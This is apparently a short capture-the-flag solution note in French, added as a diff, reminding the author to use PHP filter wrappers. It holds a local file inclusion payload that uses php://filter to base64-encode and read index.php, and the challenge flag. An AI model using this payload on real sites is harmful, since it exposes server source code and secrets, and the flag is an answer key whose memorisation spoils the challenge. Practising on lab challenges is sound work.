@@ -1,0 +1,5 @@
+Ne pas oublier les php filter !!!
+
+?post=php://filter/convert.base64-encode/resource=index.php
+
+HackademINT{R3member_wr4pp3rs}
